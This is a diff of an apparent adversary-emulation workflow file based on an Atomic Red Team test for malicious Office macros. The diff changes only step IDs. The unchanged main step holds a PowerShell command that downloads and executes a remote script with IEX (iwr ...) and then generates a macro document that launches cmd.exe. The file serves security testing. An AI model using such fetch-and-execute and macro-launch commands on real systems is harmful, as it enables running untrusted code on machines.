@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "c2d9e81e-5df7-4362-b70e-acb43c3fed6b",
+      "id": "864629fd-b3e7-4e1e-9e38-b7f4b657dfc8",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "ddfde453-39b4-4502-8e32-3bc4d007ea25",
+      "id": "e40d7e5f-e871-4daf-b129-fd8e3b6f3ab5",
       "name": "Check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "76e04599-0662-49d4-8043-83626a41eff9",
+      "id": "0335e2de-ca3c-430c-b05c-bf411ee84771",
       "name": "Resolve dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "7b743f8d-91df-461d-9975-115ca56babe1",
+      "id": "852e8c3d-97cd-4156-a30b-9b12fd5021ac",
       "name": "Re-check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "ddfde453-39b4-4502-8e32-3bc4d007ea25",
+      "s": "e40d7e5f-e871-4daf-b129-fd8e3b6f3ab5",
       "p": "on-success",
-      "o": "c2d9e81e-5df7-4362-b70e-acb43c3fed6b"
+      "o": "864629fd-b3e7-4e1e-9e38-b7f4b657dfc8"
     },
     {
-      "s": "ddfde453-39b4-4502-8e32-3bc4d007ea25",
+      "s": "e40d7e5f-e871-4daf-b129-fd8e3b6f3ab5",
       "p": "on-failure",
-      "o": "76e04599-0662-49d4-8043-83626a41eff9"
+      "o": "0335e2de-ca3c-430c-b05c-bf411ee84771"
     },
     {
-      "s": "76e04599-0662-49d4-8043-83626a41eff9",
+      "s": "0335e2de-ca3c-430c-b05c-bf411ee84771",
       "p": "on-success",
-      "o": "7b743f8d-91df-461d-9975-115ca56babe1"
+      "o": "852e8c3d-97cd-4156-a30b-9b12fd5021ac"
     },
     {
-      "s": "7b743f8d-91df-461d-9975-115ca56babe1",
+      "s": "852e8c3d-97cd-4156-a30b-9b12fd5021ac",
       "p": "on-failure",
-      "o": "c2d9e81e-5df7-4362-b70e-acb43c3fed6b"
+      "o": "864629fd-b3e7-4e1e-9e38-b7f4b657dfc8"
     }
   ],
   "tags": [
